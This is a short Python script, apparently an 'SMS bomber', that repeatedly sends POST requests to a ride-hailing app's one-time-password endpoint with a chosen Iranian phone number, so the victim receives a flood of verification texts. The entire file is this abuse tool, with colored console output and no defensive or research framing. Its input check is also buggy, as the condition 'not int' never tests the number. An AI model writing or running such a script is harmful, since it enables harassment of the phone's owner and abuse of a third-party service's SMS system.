from colorama import Fore as c # c means color
from requests import post
import os
import time

from colorama import Fore as c

# cont varable
class setting:
    INPUT_STRUCT = c.RED + " [" + c.WHITE + "~" + c.RED + "]"
    STRUCT = c.RED + " [" + c.WHITE + "!" + c.RED + "]"


def sms_boomber(phonenumber, sms_number):
    try:
        # Check if input is null or not valid (like string)
        if phonenumber == None or "" or not int:
            print(setting.STRUCT + c.RED + " Please enter a valid number!")
        else:
            try:
            # Send sms via post http method
                URL = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
                data = {
                    "cellphone": "+98" + phonenumber
                }

                for i in range(int(sms_number)):
                    response = post(URL, data)
                    if response.status_code == 200:
                        os.system("clear" or "cls")
                        print(setting.STRUCT + c.WHITE + " Send " + c.RED + str(i) + c.WHITE + " sms successfuly!")
                    else:
                        print(setting.STRUCT + c.WHITE + " Send" + c.RED + str(i) + c.RED + " sms Failed!")

                    
                    time.sleep(3)

            except Exception as err:
                print(setting.STRUCT + " Error whene sending sms!")
                exit()

    except Exception as err:
        print(err)
        print(setting.STRUCT + c.RED + "Somethink went wring! Please try again.")
